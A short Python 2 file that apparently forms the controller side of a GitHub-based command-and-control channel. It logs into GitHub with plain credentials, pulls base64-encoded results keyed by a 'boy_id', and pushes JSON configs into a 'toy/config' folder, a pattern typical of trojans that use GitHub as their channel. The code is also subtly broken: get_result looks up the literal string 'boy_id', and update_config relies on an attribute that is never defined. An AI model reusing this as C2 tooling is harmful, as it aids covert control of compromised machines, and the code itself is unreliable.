# -*- coding: utf-8 -*-
# @Author: arp
# @Date:   2017-12-27 19:09:16
# @Last Modified by:   test
# @Last Modified time: 2018-01-09 07:35:41
import json
import base64
from github3 import login


class BaseHandler(object):
    result_url = 'https://raw.githubusercontent.com/how2how/toy/master/data/'

    def __init__(self, guser, gpass, repo):
        self.gh = self.repo = self.branch = None
        self.connect(guser, gpass, repo)

    def connect(self, u, p, repo):
        self.gh = login(username=u, password=p)
        self.repo = self.gh.repository(u, repo)
        self.branch = self.repo.branch('master')
        return

    def get_file(self, filepath):
        tree = self.branch.commit.commit.tree.recurse()
        for filename in tree.tree:
            if filepath in filename.path:
                print '[*] Found file %s' % filepath
                blob = self.repo.blob(filename._json_data['sha'])
                return blob.content
        return None

    def get_result(self, boy_id):
        path = 'data' + '/' + 'boy_id'
        result = self.get_file(path)
        return base64.b64decode(result) if result else None

    def update_config(self, config, msg="new conf"):
        remote_path = 'toy/config/%s.json' % self._id
        self.repo.create_file(
            remote_path, msg, base64.b64encode(json.dumps(config)))
        return
